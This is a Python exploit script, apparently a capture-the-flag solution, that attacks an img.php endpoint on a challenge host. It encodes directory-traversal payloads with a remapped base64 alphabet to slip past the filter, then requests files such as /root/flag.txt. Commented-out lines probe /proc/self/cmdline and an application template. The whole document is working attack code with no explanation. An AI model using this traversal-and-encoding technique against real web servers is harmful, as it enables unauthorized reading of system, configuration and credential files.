import string
import requests as req
import base64
import urllib


z = {'0': 'Y', '2': 'P', '4': 'y', '6': 'e', '8': 'v', 'B': 'z', 'D': 'N', 'F': 't', 'H': 'x', 'J': 'U', 'L': 'X', 'N': 'F', 'P': 'V', 'R': 'q', 'T': 'a', 'V': 'l', 'X': 'm', 'Z': 'S', 'b': '4', 'd': 'B', 'f': 'h', 'h': '5', 'j': 'c', 'l': 'M', 'n': '9', 'p': 'w', 'r': '1', 't': '8', 'v': 'o', 'x': 'i', 'z': 'K',
     '+': 'u', '/': 'A', '1': '0', '3': 'C', '5': 'T', '7': 'I', '9': 'k', 'A': 'b', 'C': 'J', 'G': '7', 'I': 'f', 'K': '6', 'M': 'Z', 'O': '2', 'Q': '+', 'S': 'd', 'U': '3', 'W': 'R', 'Y': 'W', 'a': 'L', 'c': 'r', 'e': 'g', 'g': 'n', 'i': 'E', 'k': 'j', 'm': 'G', 'o': 'H', 'q': 'Q', 's': 'p', 'u': 's', 'w': 'O', 'y': 'D', 'E': '\\'}


b64table = string.maketrans(
    ''.join([z[k] for k in z.keys()]), ''.join(z.keys()))

URL = 'http://3fc6a707471d4c83959773ac33db4ec348f07f0fa23e4e15.changame.ichunqiu.com/img.php?name={}'


def get(pl):
    pl = base64.b64encode(pl)
    print "[+] Normal Base64 :", pl
    pl = pl.translate(b64table)
    print "[+] Encode Base64 :", pl
    pl = urllib.quote(pl)
    res = req.get(URL.format(pl))
    print(res.content)


if __name__ == '__main__':
    # get("../../../../../../proc/self/cmdline")
    # get("../../../../../../proc/self/cwd/templates/upload.html")
    get("../../../../../../root/flag.txt")
